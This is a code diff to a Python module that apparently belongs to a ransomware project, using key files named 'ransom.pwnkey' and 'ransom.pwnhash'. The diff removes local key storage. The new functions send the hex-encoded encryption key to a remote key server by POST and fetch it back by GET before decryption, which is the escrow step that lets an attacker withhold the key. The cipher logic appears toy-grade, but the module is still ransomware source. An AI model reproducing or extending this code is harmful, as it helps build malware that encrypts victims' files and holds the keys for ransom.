@@ -1,17 +1,23 @@
 import hashlib
-
 import os
 
-from file_util import put_file, get_file
-from cipher.reverse import ReverseCipher
+import requests
 
-STATIC_KEY = "6l72xhpwZ9P3RjTHUi8vuq2hHP0dlaSz"
-
-SYMBOLS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
+from fileutil import put_file, get_file
 
 KEY_FILE = "ransom.pwnkey"
 
 KEY_HASH_FILE = "ransom.pwnhash"
+
+
+def hex_string_to_ascii_string(hex_string):
+    hex_list = [hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]
+
+    return ''.join(map(chr, [int("0x" + hex_part, 0) for hex_part in hex_list]))
+
+
+def create_key():
+    return Key.from_string(os.urandom(32))
 
 
 def get_md5(string):
@@ -21,43 +27,48 @@ def get_md5(string):
     return md5
 
 
-def create_key():
-    """Generate key"""
-    return Key.from_string(os.urandom(32))
-
-
 def caeser_key(key):
     new_key = 0
-    for c in key.ints:
-        new_key = new_key ^ c
+    for i in key.ints:
+        new_key = new_key ^ i
+
     return new_key
 
 
-def get_key_file(root_dir):
-    key_file_path = os.path.join(root_dir, KEY_FILE)
+def get_hash(root_dir):
     hash_file_path = os.path.join(root_dir, KEY_HASH_FILE)
-
-    if not os.path.exists(key_file_path):
-        raise Exception('No key file found, cannot decrypt.')
 
     if not os.path.exists(hash_file_path):
         raise Exception('No hash file found, cannot decrypt.')
 
-    key = Key.from_string(get_file(key_file_path))
-    stored_hash = get_file(hash_file_path)
+    return get_file(hash_file_path)
+
+
+def get_key(key_server, hash_dir):
+    key = Key.from_string(get_key_string(key_server))
+    stored_hash = get_hash(hash_dir)
 
     if key.md5 != stored_hash:
         raise Exception('Incorrect key, cannot decrypt.')
 
-    os.remove(key_file_path)
-    os.remove(hash_file_path)
+    os.remove(os.path.join(hash_dir, KEY_HASH_FILE))
 
     return key
 
 
-def export_key_file(root_dir, key):
-    put_file(os.path.join(root_dir, KEY_FILE), key.string)
-    put_file(os.path.join(root_dir, KEY_HASH_FILE), key.md5)
+def get_key_string(key_server):
+    key_response = requests.get(key_server + "/retrieve")
+
+    return hex_string_to_ascii_string(key_response.json()["key"])
+
+
+def export_key(key_server, key, hash_dir):
+    response = requests.post(key_server + "/accept", data=key.hex_string)
+
+    if not response.ok:
+        raise Exception('Could not export key.')
+
+    put_file(os.path.join(hash_dir, KEY_HASH_FILE), key.md5)
 
 
 def rotate_key(key, block):
@@ -77,6 +88,7 @@ class Key:
         self.string = string
         self.ints = ints
         self.md5 = get_md5(string).hexdigest()
+        self.hex_string = ''.join(c.encode('hex') for c in self.string)
 
     @classmethod
     def from_string(cls, string):
@@ -84,4 +96,6 @@ class Key:
 
     @classmethod
     def from_ints(cls, ints):
-        return cls(''.join(map(chr, ints)), ints)
+        key_string = ''.join(map(chr, ints))
+
+        return cls(key_string, ints)
